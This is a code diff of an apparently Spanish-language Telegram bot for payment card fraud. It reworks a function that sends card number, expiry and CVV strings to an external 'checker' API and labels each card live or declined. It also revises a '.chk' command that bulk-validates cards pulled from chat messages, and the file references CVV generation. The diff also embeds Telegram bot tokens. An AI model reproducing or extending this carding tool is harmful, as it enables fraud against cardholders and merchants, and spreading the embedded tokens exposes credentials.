@@ -244,30 +244,29 @@ def generar_cvv(red):
 
 # --- LÓGICA DEL CHECKER EXTERNO ---
 
-def api_checker(card_data):
+# --- LÓGICA DEL CHECKER EXTERNO CORREGIDA ---
+def api_checker(card_data, session=None): # Añadimos session como opcional
     url = "https://ke1.be/en/checker2/api.php"
     payload = {"data": card_data}
+    
+    # Si no nos pasan una sesión, usamos requests normal (pero mejor pasarla)
+    caller = session if session else requests
+    
     try:
-        # Añadimos un User-Agent para que el servidor no nos bloquee pensando que somos un bot simple
-        headers = {'User-Agent': 'Mozilla/5.0'}
-        r = requests.post(url, data=payload, timeout=15, headers=headers)
-        
-        # En lugar de r.text[9], buscamos contenido
-        respuesta = r.text.upper()
-        
-        if "LIVE" in respuesta or "APPROVED" in respuesta:
-            return "LIVE", "Tarjeta Aceptada"
-        elif "DEAD" in respuesta or "DECLINED" in respuesta or "REJECTED" in respuesta:
-            return "RECHAZADO", "Tarjeta Declinada"
-        elif "UNKNOWN" in respuesta:
-            return "DESCONOCIDO", "Estado no verificado"
+        r = caller.post(url, data=payload, timeout=15)
+        text = r.text.upper()
+
+        # Validación por contenido, no por posición fija [9]
+        if "LIVE" in text or "APPROVED" in text:
+            return "LIVE", "✅ Tarjeta Live"
+        elif "DEAD" in text or "DECLINED" in text:
+            return "RECHAZADO", "❌ Declinada"
         else:
-            # Si el servidor responde algo raro, lo capturamos aquí
-            return "ERROR", f"Respuesta extraña del servidor: {r.text[:20]}..."
+            return "DESCONOCIDO", f"Respuesta: {r.text[:30]}"
             
     except Exception as e:
-        return "ERROR", f"Fallo de conexión: {str(e)}"
-
+        return "ERROR", f"Error de conexión: {str(e)}"
+        
 # --- VARIABLES DE ESTADO ---
 user_settings = {}
 user_history = {}
@@ -278,34 +277,34 @@ user_history = {}
 
 async def chk_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     raw_input = update.message.text.replace('.chk', '').strip()
-    
     if not raw_input:
-        await update.message.reply_text("❌ Formato: `.chk tarjeta|mes|año|cvv` ")
+        await update.message.reply_text("❌ Formato: `.chk tarjeta|mes|año|cvv`")
         return
 
-    # Regex más flexible
     import re
     found = re.findall(r'\d{15,16}\s*\|\s*\d{1,2}\s*\|\s*\d{2,4}\s*\|\s*\d{3,4}', raw_input)
     
     if not found:
-        await update.message.reply_text("❌ No se detectó el formato correcto.")
+        await update.message.reply_text("❌ No se detectaron tarjetas válidas.")
         return
 
-    msg_espera = await update.message.reply_text(f"🔍 Procesando {len(found)} tarjetas...")
+    msg_espera = await update.message.reply_text(f"🔍 Revisando {len(found)} tarjetas...")
 
-    # Usar sesión para mejorar velocidad y estabilidad
+    # Creamos la sesión aquí para que api_checker la use
     with requests.Session() as session:
         session.headers.update({'User-Agent': 'Mozilla/5.0'})
         
         resultados = []
         for card in found:
-            status, info = api_checker(card, session) # Pasar la sesión
-            icono = "✅" if status == "LIVE" else "❌" if status == "RECHAZADO" else "⚠️"
-            resultados.append(f"{icono} `{card}` -> {info}")
+            # Ahora enviamos 'session' correctamente
+            status, info = api_checker(card, session) 
+            resultados.append(f"`{card}` -> {info}")
 
+    # Enviamos el resultado final
     await update.message.reply_text("\n".join(resultados), parse_mode='Markdown')
     await msg_espera.delete()
-    
+
+
 async def ejecutar_generacion(update: Update, context: ContextTypes.DEFAULT_TYPE, raw_data: str):
     user_id = update.effective_user.id
     cantidad = user_settings.get(user_id, 10)
@@ -402,7 +401,7 @@ async def dep_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 if __name__ == '__main__':
     # Reemplaza con tu Token real
-    TOKEN = "8613878245:AAE8TDDKY5H1qCg6l5PsaP62ySvGROrZMGM"
+    TOKEN = "8613878245:AAEMI5EnyXSKpKwxz2BB5J3mlzKzxz411DE"
     app = ApplicationBuilder().token(TOKEN).build()
     
     app.add_handler(CommandHandler("start", start))
